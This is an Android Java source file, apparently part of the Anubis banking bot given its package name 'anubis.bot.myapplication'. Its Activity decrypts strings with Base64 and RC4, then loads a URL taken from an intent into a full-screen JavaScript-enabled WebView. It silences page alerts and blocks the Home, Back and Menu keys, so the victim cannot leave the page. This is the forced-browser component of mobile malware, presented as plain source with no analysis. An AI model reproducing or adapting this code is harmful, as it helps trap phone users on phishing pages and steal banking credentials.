package anubis.bot.myapplication.Activity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;
import anubis.bot.myapplication.Constants;

public class ActivityOpenURL extends Activity {
    Constants const_ = new Constants();
    UtilsClass SF = new UtilsClass();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_inj);
    }

    @Override
    protected void onStart() {
        super.onStart();

        Intent intent = getIntent();
        String url = intent.getStringExtra("url");
        if(!url.equals("")||!url.equals(null)) {
          //  WebView wv = (WebView) findViewById(R.id.webView);
          //  wv.getSettings().setJavaScriptEnabled(true);
         //   wv.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
         //   wv.setWebViewClient(new MyWebViewClient());
        //    wv.setWebChromeClient(new MyWebChromeClient());
          //  wv.loadUrl(url);


        WebView view = new WebView(this);
        view.getSettings().setJavaScriptEnabled(true);
        view.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        view.setWebViewClient(new MyWebViewClient());
        view.setWebChromeClient(new MyWebChromeClient());
        view.loadUrl(url);

      //  view.setBackgroundColor(Color.TRANSPARENT);
        setContentView(view);


        }
    }
    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageFinished (WebView view, String url){
        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {

            return false;
        }
    }
    private class MyWebChromeClient extends WebChromeClient {

        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {

            return true;
        }
    }

    @Override
    protected void onStop() {
        super.onStop();

    }
    @Override
    public void onDestroy(){
        super.onDestroy();
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
}
